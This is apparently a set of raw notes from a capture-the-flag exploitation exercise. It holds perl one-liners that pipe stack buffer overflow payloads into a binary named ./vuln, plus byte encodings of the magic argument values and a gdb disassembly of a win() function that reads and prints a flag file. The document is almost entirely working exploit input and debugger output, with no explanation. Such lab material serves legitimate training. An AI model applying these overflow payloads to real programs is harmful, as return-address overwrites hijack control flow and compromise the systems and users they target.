aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

0x08049296

perl -e 'print "o"x108 . "\x18\xd1\xff\xff" . "\x96\x92\x04\x08" . "\x0D\xF0\xFE\xCA" . "\x0D\xF0\x0D\xF0"' | ./vuln
perl -e 'print "o"x108 . "\x18\xd1\xff\xff" . "\x96\x92\x04\x08"' | ./vuln
perl -e 'print "o"x112 . "\x96\x92\x04\x08"' | ./vuln

ebp: 0xffffd118

0xCAFEF00D
\x0D\xF0\xFE\xCA

0xF00DF00D
\x0D\xF0\x0D\xF0


   0x08049296 <+0>:	endbr32 
   0x0804929a <+4>:	push   ebp
   0x0804929b <+5>:	mov    ebp,esp
   0x0804929d <+7>:	push   ebx
   0x0804929e <+8>:	sub    esp,0x54
   0x080492a1 <+11>:	call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:	add    ebx,0x2d5a
   0x080492ac <+22>:	sub    esp,0x8
   0x080492af <+25>:	lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:	push   eax
   0x080492b6 <+32>:	lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:	push   eax
   0x080492bd <+39>:	call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:	add    esp,0x10
   0x080492c5 <+47>:	mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:	jne    0x80492f8 <win+98>
   0x080492ce <+56>:	sub    esp,0x4
   0x080492d1 <+59>:	lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:	push   eax
   0x080492d8 <+66>:	lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:	push   eax
   0x080492df <+73>:	lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:	push   eax
   0x080492e6 <+80>:	call   0x80490e0 <printf@plt>
   0x080492eb <+85>:	add    esp,0x10
   0x080492ee <+88>:	sub    esp,0xc
   0x080492f1 <+91>:	push   0x0
   0x080492f3 <+93>:	call   0x8049130 <exit@plt>
   0x080492f8 <+98>:	sub    esp,0x4
   0x080492fb <+101>:	push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:	push   0x40
   0x08049300 <+106>:	lea    eax,[ebp-0x4c]
   0x08049303 <+109>:	push   eax
   0x08049304 <+110>:	call   0x8049100 <fgets@plt>
   0x08049309 <+115>:	add    esp,0x10
   0x0804930c <+118>:	cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:	jne    0x804932f <win+153>
   0x08049315 <+127>:	cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:	jne    0x8049332 <win+156>
   0x0804931e <+136>:	sub    esp,0xc
   0x08049321 <+139>:	lea    eax,[ebp-0x4c]
   0x08049324 <+142>:	push   eax
   0x08049325 <+143>:	call   0x80490e0 <printf@plt>
   0x0804932a <+148>:	add    esp,0x10
   0x0804932d <+151>:	jmp    0x8049333 <win+157>
   0x0804932f <+153>:	nop
   0x08049330 <+154>:	jmp    0x8049333 <win+157>
   0x08049332 <+156>:	nop
   0x08049333 <+157>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:	leave  
   0x08049337 <+161>:	ret
